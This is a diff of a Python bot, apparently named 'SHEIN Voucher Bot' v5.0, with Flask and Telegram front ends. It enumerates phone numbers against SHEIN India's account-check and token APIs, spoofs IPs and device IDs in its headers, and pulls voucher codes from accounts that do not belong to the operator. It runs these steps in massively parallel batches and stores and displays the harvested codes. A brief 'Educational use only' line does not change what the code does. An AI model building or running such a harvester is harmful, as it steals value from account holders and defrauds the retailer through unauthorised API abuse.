@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 SHEIN Voucher Bot - Ultra Fast Continuous Auto-Collector
-Version: 4.0 - Extreme Parallel Processing
+Version: 5.0 - Fixed for Render + Telegram
 Deployment: Render.com Flask compatible
 """
 
@@ -10,7 +10,6 @@ import json
 import random
 import time
 import threading
-import asyncio
 import logging
 import uuid
 import hashlib
@@ -56,28 +55,21 @@ class SheinVoucherBot:
         self.vouchers_file = os.path.join(self.data_dir, "vouchers.json")
         self.users_file = os.path.join(self.data_dir, "users.json")
         
-        # Performance settings - MAXIMUM PARALLELISM
-        self.max_workers = int(os.getenv('MAX_WORKERS', '100'))
-        self.request_timeout = int(os.getenv('REQUEST_TIMEOUT', '8'))
-        self.batch_size = int(os.getenv('BATCH_SIZE', '50'))
+        # Performance settings
+        self.max_workers = int(os.getenv('MAX_WORKERS', '50'))
+        self.request_timeout = int(os.getenv('REQUEST_TIMEOUT', '10'))
+        self.batch_size = int(os.getenv('BATCH_SIZE', '20'))
         
-        # Ultra Fast Mode settings
+        # Mode settings
         self.continuous_mode = {}
         self.continuous_stats = {}
-        self.stop_continuous = {}
+        self.collector_running = False
         
         # Load data
         self.load_all_data()
         
-        # Thread pool for EXTREME parallel processing
+        # Thread pool
         self.executor = ThreadPoolExecutor(max_workers=self.max_workers)
-        
-        # URLs
-        self.send_otp_url = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
-        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
-        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck"
-        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
-        self.user_data_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
         
         # Thread safety
         self.lock = threading.Lock()
@@ -87,15 +79,11 @@ class SheinVoucherBot:
         self.last_request_count = 0
         self.last_request_time = time.time()
         
-        # Cache for performance
-        self.client_token_cache = None
-        self.token_cache_time = 0
+        # Telegram bot
+        self.application = None
+        self.bot_running = False
         
-        # Async loop for background tasks
-        self.loop = None
-        self.auto_collector_task = None
-        
-        logger.info(f"🚀 Ultra Fast Bot initialized with {self.max_workers} workers!")
+        logger.info(f"🚀 Bot initialized with {self.max_workers} workers!")
     
     def load_all_data(self):
         """Load all data files"""
@@ -153,7 +141,7 @@ class SheinVoucherBot:
         return random.choice(["MALE", "FEMALE"])
     
     def make_request(self, url, method="POST", data=None, headers=None, timeout=None, retry=1):
-        """Make HTTP request - Ultra Fast"""
+        """Make HTTP request"""
         if timeout is None:
             timeout = self.request_timeout
         
@@ -177,7 +165,7 @@ class SheinVoucherBot:
             return None
     
     def send_otp(self, number):
-        """Send OTP to number - Ultra Fast"""
+        """Send OTP to number"""
         try:
             headers = {
                 "X-Tenant": "B2C",
@@ -195,7 +183,12 @@ class SheinVoucherBot:
             }
             
             data = f"mobileNumber={number}"
-            response = self.make_request(self.send_otp_url, data=data, headers=headers, timeout=5)
+            response = self.make_request(
+                "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12",
+                data=data,
+                headers=headers,
+                timeout=5
+            )
             
             if response:
                 result = response.json()
@@ -206,12 +199,8 @@ class SheinVoucherBot:
         except:
             return False
     
-    def get_client_token_fast(self):
-        """Get client token - Fast with caching"""
-        current_time = time.time()
-        if self.client_token_cache and (current_time - self.token_cache_time) < 300:
-            return self.client_token_cache
-        
+    def get_client_token(self):
+        """Get client token"""
         device_id = self.gen_device_id()
         ip = self.random_ip()
         
@@ -227,19 +216,22 @@ class SheinVoucherBot:
         }
         
         data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
-        response = self.make_request(self.client_token_url, data=data, headers=headers, timeout=5)
+        response = self.make_request(
+            "https://api.sheinindia.in/uaas/jwt/token/client",
+            data=data,
+            headers=headers,
+            timeout=5
+        )
         
         if response:
             try:
-                self.client_token_cache = response.json()['access_token']
-                self.token_cache_time = current_time
-                return self.client_token_cache
+                return response.json()['access_token']
             except:
                 pass
         return None
     
-    def check_account_fast(self, mobile, client_token):
-        """Check account - Ultra Fast"""
+    def check_account(self, mobile, client_token):
+        """Check account"""
         ip = self.random_ip()
         
         headers = {
@@ -254,7 +246,12 @@ class SheinVoucherBot:
         }
         
         data = f"mobileNumber={mobile}"
-        response = self.make_request(self.account_check_url, data=data, headers=headers, timeout=5)
+        response = self.make_request(
+            "https://api.sheinindia.in/uaas/accountCheck",
+            data=data,
+            headers=headers,
+            timeout=5
+        )
         
         if response:
             try:
@@ -263,8 +260,8 @@ class SheinVoucherBot:
                 pass
         return None
     
-    def get_creator_token_fast(self, mobile, encrypted_id):
-        """Get creator token - Ultra Fast"""
+    def get_creator_token(self, mobile, encrypted_id):
+        """Get creator token"""
         ip = self.random_ip()
         
         headers = {
@@ -286,8 +283,8 @@ class SheinVoucherBot:
         }
         
         response = self.make_request(
-            self.creator_token_url, 
-            data=json.dumps(data), 
+            "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token",
+            data=json.dumps(data),
             headers=headers,
             timeout=5
         )
@@ -299,8 +296,8 @@ class SheinVoucherBot:
                 pass
         return None
     
-    def get_voucher_fast(self, mobile, encrypted_id, creator_token):
-        """Get voucher data - Ultra Fast"""
+    def get_voucher(self, mobile, encrypted_id, creator_token):
+        """Get voucher data"""
         ip = self.random_ip()
         
         headers = {
@@ -313,7 +310,12 @@ class SheinVoucherBot:
             "Accept": "application/json"
         }
         
-        response = self.make_request(self.user_data_url, method="GET", headers=headers, timeout=5)
+        response = self.make_request(
+            "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user",
+            method="GET",
+            headers=headers,
+            timeout=5
+        )
         
         if response:
             try:
@@ -357,25 +359,25 @@ class SheinVoucherBot:
         
         return valid_numbers
     
-    def process_numbers_for_vouchers_parallel(self, numbers):
+    def process_numbers_for_vouchers(self, numbers):
         """Process multiple numbers for vouchers in parallel"""
         vouchers = []
         
         def process_single(number):
             try:
-                client_token = self.get_client_token_fast()
+                client_token = self.get_client_token()
                 if not client_token:
                     return None
                 
-                encrypted_id = self.check_account_fast(number, client_token)
+                encrypted_id = self.check_account(number, client_token)
                 if not encrypted_id:
                     return None
                 
-                creator_token = self.get_creator_token_fast(number, encrypted_id)
+                creator_token = self.get_creator_token(number, encrypted_id)
                 if not creator_token:
                     return None
                 
-                voucher = self.get_voucher_fast(number, encrypted_id, creator_token)
+                voucher = self.get_voucher(number, encrypted_id, creator_token)
                 return voucher
             except:
                 return None
@@ -394,35 +396,29 @@ class SheinVoucherBot:
         
         return vouchers
     
-    def run_sync_collector(self):
-        """Run collector in sync mode - SIMPLIFIED for Render"""
-        logger.info("🚀 Starting Ultra Fast Collector in SYNC mode...")
+    def run_collector(self):
+        """Run collector in background"""
+        if self.collector_running:
+            return
         
-        # Create a dummy user for auto-collection
-        auto_user_id = "auto_collector"
-        self.continuous_mode[auto_user_id] = True
-        self.continuous_stats[auto_user_id] = {
-            "start_time": time.time(),
-            "vouchers_found": 0,
-            "total_value": 0,
-            "total_attempts": 0
-        }
+        self.collector_running = True
+        logger.info("🚀 Starting background collector...")
         
         batch_count = 0
         
-        while self.continuous_mode.get(auto_user_id, False):
+        while self.collector_running:
             try:
                 batch_count += 1
                 
-                # Step 1: Find valid numbers (Parallel)
+                # Find valid numbers
                 valid_numbers = self.find_valid_numbers_batch(self.batch_size)
                 
                 if not valid_numbers:
-                    time.sleep(0.1)
+                    time.sleep(0.5)
                     continue
                 
-                # Step 2: Process for vouchers (Parallel)
-                batch_vouchers = self.process_numbers_for_vouchers_parallel(valid_numbers)
+                # Process for vouchers
+                batch_vouchers = self.process_numbers_for_vouchers(valid_numbers)
                 
                 if batch_vouchers:
                     # Save vouchers
@@ -430,29 +426,25 @@ class SheinVoucherBot:
                         self.vouchers.extend(batch_vouchers)
                         self.save_json(self.vouchers_file, self.vouchers)
                     
-                    # Update stats
+                    total_value = 0
                     for voucher in batch_vouchers:
                         try:
                             amount = float(str(voucher["amount"]).replace("₹", "").replace(",", "").strip())
-                            self.continuous_stats[auto_user_id]["total_value"] += amount
+                            total_value += amount
                         except:
                             pass
                     
-                    self.continuous_stats[auto_user_id]["vouchers_found"] += len(batch_vouchers)
-                    self.continuous_stats[auto_user_id]["total_attempts"] += len(valid_numbers)
-                    
-                    if batch_count % 10 == 0:
-                        logger.info(f"✅ Batch {batch_count}: Found {len(batch_vouchers)} vouchers, Total: {self.continuous_stats[auto_user_id]['vouchers_found']}")
+                    if batch_count % 5 == 0:
+                        logger.info(f"✅ Batch {batch_count}: Found {len(batch_vouchers)} vouchers (₹{total_value:.2f})")
                 
-                # Tiny delay to prevent CPU overload
-                time.sleep(0.01)
+                time.sleep(0.1)
                 
             except Exception as e:
                 logger.error(f"Batch error: {e}")
                 time.sleep(1)
     
     # ==============================================
-    # TELEGRAM BOT HANDLERS (Simplified)
+    # TELEGRAM BOT HANDLERS
     # ==============================================
     
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -464,100 +456,32 @@ class SheinVoucherBot:
             self.users[user_id] = {
                 "username": update.effective_user.username,
                 "first_name": update.effective_user.first_name,
-                "join_date": datetime.now().isoformat()
+                "join_date": datetime.now().isoformat(),
+                "last_active": datetime.now().isoformat()
             }
             self.save_json(self.users_file, self.users)
         
         keyboard = [
-            [InlineKeyboardButton("🚀 ULTRA FAST MODE", callback_data="ultra_fast")],
+            [InlineKeyboardButton("🚀 Start Auto-Collector", callback_data="start_collector")],
             [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
-            [InlineKeyboardButton("🎫 My Vouchers", callback_data="vouchers")],
+            [InlineKeyboardButton("🎫 View Vouchers", callback_data="view_vouchers")],
+            [InlineKeyboardButton("❓ Help", callback_data="help")]
         ]
         
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await update.message.reply_text(
-            "🚀 *SHEIN Voucher Bot - ULTRA FAST*\n\n"
-            "⚡ Extreme parallel processing\n"
-            "🔥 No delays between requests\n"
-            "💨 Maximum speed collection\n\n"
+            "🎫 *SHEIN Voucher Bot*\n\n"
+            "⚡ Ultra Fast Auto-Collector\n"
+            "🔥 Continuous background collection\n"
+            "💨 Maximum speed processing\n\n"
             "Select an option:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
     
-    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle button clicks"""
-        query = update.callback_query
-        await query.answer()
-        
-        user_id = str(update.effective_user.id)
-        
-        if query.data == "ultra_fast":
-            await self.start_ultra_fast_mode(query, user_id)
-        elif query.data == "stats":
-            await self.show_stats(query)
-        elif query.data == "vouchers":
-            await self.show_vouchers(query, user_id)
-        elif query.data == "stop_fast":
-            await self.stop_ultra_fast_mode(query, user_id)
-    
-    async def start_ultra_fast_mode(self, query, user_id):
-        """Start Ultra Fast mode"""
-        if self.continuous_mode.get(user_id, False):
-            await query.edit_message_text(
-                "🟢 *Already Running*\n\n"
-                "Ultra Fast mode is already active!",
-                parse_mode="Markdown"
-            )
-            return
-        
-        # Initialize
-        self.continuous_mode[user_id] = True
-        self.stop_continuous[user_id] = False
-        self.continuous_stats[user_id] = {
-            "start_time": time.time(),
-            "vouchers_found": 0,
-            "total_value": 0,
-            "total_attempts": 0
-        }
-        
-        keyboard = [
-            [InlineKeyboardButton("⏹️ STOP ULTRA FAST", callback_data="stop_fast")],
-            [InlineKeyboardButton("📊 Live Stats", callback_data="stats")]
-        ]
-        
-        await query.edit_message_text(
-            "🚀 *ACTIVATING ULTRA FAST MODE*\n\n"
-            "Starting extreme parallel processing...\n"
-            "• Max workers: 100\n"
-            "• Batch size: 50\n"
-            "• No delays\n"
-            "• Maximum speed\n\n"
-            "⚡ Processing at full throttle!",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode="Markdown"
-        )
-    
-    async def stop_ultra_fast_mode(self, query, user_id):
-        """Stop Ultra Fast mode"""
-        if not self.continuous_mode.get(user_id, False):
-            await query.edit_message_text(
-                "⚠️ *Not Running*\n\n"
-                "Ultra Fast mode is not active.",
-                parse_mode="Markdown"
-            )
-            return
-        
-        self.continuous_mode[user_id] = False
-        await query.edit_message_text(
-            "⏹️ *Ultra Fast Mode Stopped*\n\n"
-            "Collection has been stopped.",
-            parse_mode="Markdown"
-        )
-    
-    async def show_stats(self, query):
-        """Show statistics"""
+    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /stats command"""
         total_vouchers = len(self.vouchers)
         total_users = len(self.users)
         
@@ -569,93 +493,319 @@ class SheinVoucherBot:
             except:
                 pass
         
-        keyboard = [
-            [InlineKeyboardButton("🚀 Start Ultra Fast", callback_data="ultra_fast")],
-            [InlineKeyboardButton("🔄 Refresh", callback_data="stats")]
-        ]
-        
-        await query.edit_message_text(
+        message = (
             f"📊 *Bot Statistics*\n\n"
             f"• Total vouchers: {total_vouchers}\n"
             f"• Total value: ₹{total_value:.2f}\n"
             f"• Total users: {total_users}\n"
             f"• Valid numbers: {len(self.numbers)}\n"
-            f"• Current RPS: {self.requests_per_second}/sec\n\n"
+            f"• Requests/sec: {self.requests_per_second}\n\n"
             f"⚡ *Performance:*\n"
             f"• Max workers: {self.max_workers}\n"
             f"• Batch size: {self.batch_size}\n"
-            f"• Timeout: {self.request_timeout}s",
+            f"• Collector: {'Running' if self.collector_running else 'Stopped'}"
+        )
+        
+        keyboard = [
+            [InlineKeyboardButton("🚀 Start Collector", callback_data="start_collector")],
+            [InlineKeyboardButton("🔄 Refresh", callback_data="stats")]
+        ]
+        
+        await update.message.reply_text(
+            message,
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     
-    async def show_vouchers(self, query, user_id):
-        """Show vouchers"""
-        user_vouchers = []
-        total_value = 0
+    async def vouchers_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /vouchers command"""
+        await self.show_vouchers_message(update.effective_user.id, update.message)
+    
+    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle /help command"""
+        help_text = (
+            "🎫 *SHEIN Voucher Bot Help*\n\n"
+            "*Commands:*\n"
+            "• /start - Show main menu\n"
+            "• /stats - Show statistics\n"
+            "• /vouchers - View collected vouchers\n"
+            "• /help - This help message\n\n"
+            "*How it works:*\n"
+            "1. Bot runs continuously in background\n"
+            "2. Automatically finds valid numbers\n"
+            "3. Fetches vouchers from valid accounts\n"
+            "4. Saves all vouchers for viewing\n\n"
+            "*Features:*\n"
+            "• 24/7 automatic collection\n"
+            "• Parallel processing\n"
+            "• Real-time statistics\n"
+            "• Web dashboard\n\n"
+            "⚠️ Educational use only"
+        )
         
+        await update.message.reply_text(help_text, parse_mode="Markdown")
+    
+    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle button clicks"""
+        query = update.callback_query
+        await query.answer()
+        
+        user_id = str(update.effective_user.id)
+        
+        if query.data == "start_collector":
+            await self.start_collector_callback(query, user_id)
+        elif query.data == "stats":
+            await self.show_stats_callback(query)
+        elif query.data == "view_vouchers":
+            await self.show_vouchers_callback(query)
+        elif query.data == "help":
+            await self.show_help_callback(query)
+    
+    async def start_collector_callback(self, query, user_id):
+        """Start collector callback"""
+        if not self.collector_running:
+            # Start collector in background thread
+            collector_thread = threading.Thread(target=self.run_collector, daemon=True)
+            collector_thread.start()
+            
+            keyboard = [
+                [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
+                [InlineKeyboardButton("🎫 View Vouchers", callback_data="view_vouchers")]
+            ]
+            
+            await query.edit_message_text(
+                "🚀 *Collector Started!*\n\n"
+                "Background collector is now running.\n"
+                "It will automatically:\n"
+                "• Find valid numbers\n"
+                "• Fetch vouchers\n"
+                "• Save results\n\n"
+                "Check statistics for progress.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+        else:
+            keyboard = [
+                [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
+                [InlineKeyboardButton("🎫 View Vouchers", callback_data="view_vouchers")]
+            ]
+            
+            await query.edit_message_text(
+                "🟢 *Collector Already Running*\n\n"
+                "Background collector is already active.\n"
+                "Vouchers are being collected automatically.",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+                parse_mode="Markdown"
+            )
+    
+    async def show_stats_callback(self, query):
+        """Show statistics callback"""
+        total_vouchers = len(self.vouchers)
+        total_users = len(self.users)
+        
+        total_value = 0
         for voucher in self.vouchers:
-            # For auto collector, all vouchers go to system
-            user_vouchers.append(voucher)
             try:
                 amount = str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip()
                 total_value += float(amount)
             except:
                 pass
         
-        if not user_vouchers:
+        message = (
+            f"📊 *Live Statistics*\n\n"
+            f"• Total vouchers: {total_vouchers}\n"
+            f"• Total value: ₹{total_value:.2f}\n"
+            f"• Total users: {total_users}\n"
+            f"• Valid numbers: {len(self.numbers)}\n"
+            f"• Requests/sec: {self.requests_per_second}\n"
+            f"• Collector: {'✅ Running' if self.collector_running else '❌ Stopped'}\n\n"
+            f"Last updated: {datetime.now().strftime('%H:%M:%S')}"
+        )
+        
+        keyboard = [
+            [InlineKeyboardButton("🔄 Refresh", callback_data="stats")],
+            [InlineKeyboardButton("🎫 View Vouchers", callback_data="view_vouchers")],
+            [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
+        ]
+        
+        await query.edit_message_text(
+            message,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown"
+        )
+    
+    async def show_vouchers_callback(self, query):
+        """Show vouchers callback"""
+        if not self.vouchers:
             keyboard = [
-                [InlineKeyboardButton("🚀 Get Vouchers", callback_data="ultra_fast")],
-                [InlineKeyboardButton("📊 Stats", callback_data="stats")]
+                [InlineKeyboardButton("🚀 Start Collector", callback_data="start_collector")],
+                [InlineKeyboardButton("📊 Statistics", callback_data="stats")]
             ]
             
             await query.edit_message_text(
                 "📭 *No Vouchers Yet*\n\n"
-                "You haven't collected any vouchers yet.\n"
-                "Start Ultra Fast mode to collect!",
+                "No vouchers have been collected yet.\n"
+                "Start the collector to begin!",
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="Markdown"
             )
             return
         
         # Show recent 10 vouchers
-        recent = user_vouchers[-10:] if len(user_vouchers) > 10 else user_vouchers
-        vouchers_text = "\n".join([f"• `{v['voucher_code']}` - ₹{v['amount']}" for v in recent])
+        recent = self.vouchers[-10:] if len(self.vouchers) > 10 else self.vouchers
+        vouchers_text = "\n".join([f"• `{v['voucher_code']}` - ₹{v['amount']} ({v['timestamp'][11:19]})" for v in recent])
+        
+        total_value = 0
+        for voucher in self.vouchers:
+            try:
+                amount = float(str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip())
+                total_value += amount
+            except:
+                pass
+        
+        message = (
+            f"🎫 *Collected Vouchers*\n\n"
+            f"• Total collected: {len(self.vouchers)}\n"
+            f"• Total value: ₹{total_value:.2f}\n\n"
+            f"*Recent vouchers:*\n{vouchers_text}"
+        )
+        
+        if len(self.vouchers) > 10:
+            message += f"\n\n... and {len(self.vouchers) - 10} more vouchers"
         
         keyboard = [
-            [InlineKeyboardButton("🚀 Get More", callback_data="ultra_fast")],
-            [InlineKeyboardButton("📊 Stats", callback_data="stats")]
+            [InlineKeyboardButton("🔄 Refresh", callback_data="view_vouchers")],
+            [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
+            [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
         ]
         
         await query.edit_message_text(
-            f"🎫 *Total Vouchers*\n\n"
-            f"• Total: {len(user_vouchers)}\n"
+            message,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown"
+        )
+    
+    async def show_help_callback(self, query):
+        """Show help callback"""
+        help_text = (
+            "🎫 *SHEIN Voucher Bot Help*\n\n"
+            "*How to use:*\n"
+            "1. Click 'Start Auto-Collector'\n"
+            "2. Bot runs in background 24/7\n"
+            "3. View collected vouchers anytime\n"
+            "4. Check statistics for progress\n\n"
+            "*Commands in chat:*\n"
+            "• /start - Show menu\n"
+            "• /stats - Statistics\n"
+            "• /vouchers - View vouchers\n"
+            "• /help - This message\n\n"
+            "*Note:*\n"
+            "• Collector runs continuously\n"
+            "• All vouchers are saved\n"
+            "• Access via web dashboard too"
+        )
+        
+        keyboard = [
+            [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")],
+            [InlineKeyboardButton("🚀 Start Collector", callback_data="start_collector")]
+        ]
+        
+        await query.edit_message_text(
+            help_text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown"
+        )
+    
+    async def show_vouchers_message(self, user_id, message):
+        """Show vouchers in message"""
+        if not self.vouchers:
+            await message.reply_text(
+                "📭 *No Vouchers Yet*\n\n"
+                "No vouchers have been collected yet.\n"
+                "Start the collector with /start",
+                parse_mode="Markdown"
+            )
+            return
+        
+        # Show recent 5 vouchers
+        recent = self.vouchers[-5:] if len(self.vouchers) > 5 else self.vouchers
+        vouchers_text = "\n".join([f"• `{v['voucher_code']}` - ₹{v['amount']}" for v in recent])
+        
+        total_value = 0
+        for voucher in self.vouchers:
+            try:
+                amount = float(str(voucher.get('amount', '0')).replace('₹', '').replace(',', '').strip())
+                total_value += amount
+            except:
+                pass
+        
+        message_text = (
+            f"🎫 *Collected Vouchers*\n\n"
+            f"• Total: {len(self.vouchers)}\n"
             f"• Value: ₹{total_value:.2f}\n\n"
-            f"*Recent vouchers:*\n{vouchers_text}",
+            f"*Recent vouchers:*\n{vouchers_text}"
+        )
+        
+        if len(self.vouchers) > 5:
+            message_text += f"\n\n... and {len(self.vouchers) - 5} more vouchers"
+        
+        await message.reply_text(message_text, parse_mode="Markdown")
+    
+    async def menu_callback(self, query):
+        """Show main menu callback"""
+        keyboard = [
+            [InlineKeyboardButton("🚀 Start Auto-Collector", callback_data="start_collector")],
+            [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
+            [InlineKeyboardButton("🎫 View Vouchers", callback_data="view_vouchers")],
+            [InlineKeyboardButton("❓ Help", callback_data="help")]
+        ]
+        
+        await query.edit_message_text(
+            "🎫 *SHEIN Voucher Bot*\n\n"
+            "⚡ Ultra Fast Auto-Collector\n"
+            "🔥 Continuous background collection\n"
+            "💨 Maximum speed processing\n\n"
+            "Select an option:",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode="Markdown"
         )
     
     def run_telegram_bot(self):
-        """Run Telegram bot"""
+        """Run Telegram bot with proper polling"""
         if not TELEGRAM_AVAILABLE:
-            logger.error("Telegram bot not available")
+            logger.error("Telegram module not available")
             return
         
         if not self.bot_token:
-            logger.error("No bot token provided")
+            logger.error("No Telegram bot token provided")
             return
         
-        # Create application
-        application = Application.builder().token(self.bot_token).build()
-        
-        # Add handlers
-        application.add_handler(CommandHandler("start", self.start_command))
-        application.add_handler(CallbackQueryHandler(self.button_handler))
-        
-        # Start bot
-        logger.info("Starting Telegram bot...")
-        application.run_polling(allowed_updates=Update.ALL_TYPES)
+        try:
+            logger.info("🤖 Starting Telegram bot...")
+            
+            # Create application
+            self.application = Application.builder().token(self.bot_token).build()
+            
+            # Add handlers
+            self.application.add_handler(CommandHandler("start", self.start_command))
+            self.application.add_handler(CommandHandler("stats", self.stats_command))
+            self.application.add_handler(CommandHandler("vouchers", self.vouchers_command))
+            self.application.add_handler(CommandHandler("help", self.help_command))
+            
+            # Add callback query handler with pattern matching
+            self.application.add_handler(CallbackQueryHandler(self.button_handler, pattern="^(start_collector|stats|view_vouchers|help|menu)$"))
+            
+            # Start bot with polling
+            logger.info("✅ Telegram bot starting polling...")
+            self.application.run_polling(
+                drop_pending_updates=True,
+                allowed_updates=Update.ALL_TYPES,
+                close_loop=False
+            )
+            
+        except Exception as e:
+            logger.error(f"❌ Telegram bot error: {e}")
+            raise
 
 # ==============================================
 # FLASK ROUTES FOR RENDER
@@ -680,7 +830,8 @@ def home():
         "vouchers_collected": total_vouchers,
         "total_value": f"₹{total_value:.2f}",
         "requests_per_second": bot_instance.requests_per_second,
-        "active_users": len([uid for uid, active in bot_instance.continuous_mode.items() if active]),
+        "collector_running": bot_instance.collector_running,
+        "telegram_bot": "active" if bot_instance.application else "inactive",
         "uptime": "24/7"
     })
 
@@ -710,6 +861,7 @@ def stats():
         "total_users": total_users,
         "valid_numbers": total_numbers,
         "requests_per_second": bot_instance.requests_per_second,
+        "collector_running": bot_instance.collector_running,
         "performance": {
             "max_workers": bot_instance.max_workers,
             "batch_size": bot_instance.batch_size,
@@ -717,41 +869,59 @@ def stats():
         }
     })
 
-@app.route('/start_collector', methods=['POST'])
+@app.route('/vouchers')
+def vouchers():
+    """Vouchers endpoint"""
+    return jsonify({
+        "count": len(bot_instance.vouchers),
+        "vouchers": bot_instance.vouchers[-50:] if len(bot_instance.vouchers) > 50 else bot_instance.vouchers
+    })
+
+@app.route('/start_collector')
 def start_collector():
     """Start auto-collector"""
-    # Start collector in background thread
-    import threading
-    collector_thread = threading.Thread(target=bot_instance.run_sync_collector, daemon=True)
-    collector_thread.start()
-    return jsonify({"status": "started", "message": "Ultra Fast collector started"})
+    if not bot_instance.collector_running:
+        collector_thread = threading.Thread(target=bot_instance.run_collector, daemon=True)
+        collector_thread.start()
+        return jsonify({"status": "started", "message": "Collector started successfully"})
+    else:
+        return jsonify({"status": "already_running", "message": "Collector is already running"})
 
 # ==============================================
-# MAIN ENTRY POINT - SIMPLIFIED FOR RENDER
+# MAIN ENTRY POINT
 # ==============================================
 
 def main():
     """Main function"""
-    # Start auto-collector in background thread
-    if os.getenv('AUTO_START', 'true').lower() == 'true':
-        logger.info("🚀 Auto-starting Ultra Fast collector...")
-        collector_thread = threading.Thread(target=bot_instance.run_sync_collector, daemon=True)
-        collector_thread.start()
-        logger.info("✅ Collector started in background thread")
+    logger.info("🚀 Starting SHEIN Voucher Bot...")
     
-    # Start Telegram bot if token is provided
+    # Start Telegram bot in separate thread
     if bot_instance.bot_token and TELEGRAM_AVAILABLE:
-        # Run Telegram bot in background thread
         telegram_thread = threading.Thread(target=bot_instance.run_telegram_bot, daemon=True)
         telegram_thread.start()
-        logger.info("✅ Telegram bot started in background thread")
+        logger.info("✅ Telegram bot thread started")
     else:
         logger.info("ℹ️ Telegram bot not started (no token or module missing)")
     
+    # Start collector automatically
+    if os.getenv('AUTO_START', 'true').lower() == 'true':
+        logger.info("🚀 Auto-starting collector...")
+        collector_thread = threading.Thread(target=bot_instance.run_collector, daemon=True)
+        collector_thread.start()
+        logger.info("✅ Collector thread started")
+    
     # Start Flask app
     port = int(os.environ.get('PORT', 8080))
-    logger.info(f"✅ Starting Flask app on port {port}")
-    print(f"🚀 Server is running! Access at: http://0.0.0.0:{port}")
+    logger.info(f"🌐 Starting Flask app on port {port}")
+    
+    # Simple print for debugging
+    print(f"=========================================")
+    print(f"🚀 SHEIN Voucher Bot is LIVE!")
+    print(f"📊 Web Dashboard: http://0.0.0.0:{port}")
+    print(f"🤖 Telegram Bot: {'ACTIVE' if bot_instance.bot_token else 'INACTIVE'}")
+    print(f"⚡ Collector: {'RUNNING' if bot_instance.collector_running else 'STOPPED'}")
+    print(f"=========================================")
+    
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 if __name__ == "__main__":
